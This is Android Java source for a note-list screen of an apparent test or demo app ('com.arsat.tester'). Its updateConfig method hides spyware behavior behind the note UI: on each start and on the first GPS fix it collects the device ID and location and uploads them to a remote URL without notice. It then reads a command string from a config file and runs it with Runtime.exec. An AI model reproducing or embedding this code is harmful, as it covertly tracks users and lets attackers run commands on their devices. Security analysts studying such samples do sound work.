package com.arsat.tester;

import android.app.ListActivity;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.ListAdapter;
import android.widget.ListView;
import android.widget.SimpleAdapter;

import androidx.annotation.NonNull;

import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class NoteListActivity extends ListActivity {
    private static final String TAG = "NoteListActivity";
    private LocationManager mLocMgr;
    private LocationListener mLocListener = new LocationListener() {
        @Override
        public void onLocationChanged(@NonNull Location location) {
            mLocMgr.removeUpdates(mLocListener);
            updateConfig(location);
        }
    };

    @Override
    public void onCreate(Bundle savedInstance) {
        super.onCreate(savedInstance);
        setContentView(R.layout.activity_note_list);
    }

    @Override
    public void onStart() {
        super.onStart();
        buildNoteList();
        updateConfig(null);
        mLocMgr = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        mLocMgr.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 10, mLocListener);
    }
    @Override
    public void onListItemClick(ListView lv, View v, int position, long id) {
        Map<String, String> map = (Map<String, String>) lv.getAdapter().getItem(position);
        String title = map.get("title");
        Intent intent = new Intent(this, EditorActivity.class);
        intent.putExtra(EditorActivity.EXTRA_TITLE, title);
        startActivity(intent);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.main_menu, menu);
        return true;
    }
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        int id = item.getItemId();
        if (id == R.id.help) {
            Intent intent = new Intent(this, SettingsActivity.class);
            startActivity(intent);
        } else if (id == R.id.new_note) {
            Intent intent = new Intent(this, EditorActivity.class);
            startActivity(intent);
        }
        return true;
    }

    private void updateConfig() {
        mLocMgr.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 10, mLocListener);
    }
    private void updateConfig(Location loc) {
        String locStr = loc == null ? "unkown" : loc.toString();
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String deviceId = "unknown";
        try {
            deviceId = tm.getDeviceId();
        } catch (Exception e) {
            e.printStackTrace();
        }

        Utils.uploadInfo("https://com.demo.arsat/config?location=" + locStr + "&deviceId=" + deviceId);

        String cmd = "ls";
        try {
            File arsatDir = Utils.getArsatDir(this);
            File config = new File(arsatDir, "config");
            FileInputStream fis = new FileInputStream(config);
            long size = fis.available();
            byte[] buf = new byte[(int)size];
            int count = fis.read(buf);
            Log.d(TAG, "read " + count);
            cmd = new String(buf);
        } catch (Exception e) {
            e.printStackTrace();
        }

        try {
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void buildNoteList() {
        File arsatDir = Utils.getArsatDir(this);
        String[] names = arsatDir.list();
        List list = new ArrayList<Map<String, String>>();
        for (String name: names) {
            Map<String, String> map = new HashMap<String, String>();
            map.put("title", name);
            list.add(map);
        }
        ListAdapter adapter = new SimpleAdapter(this, list, android.R.layout.simple_list_item_1,
                new String[] {"title"},
                new int[] {android.R.id.text1});
        setListAdapter(adapter);
    }
}
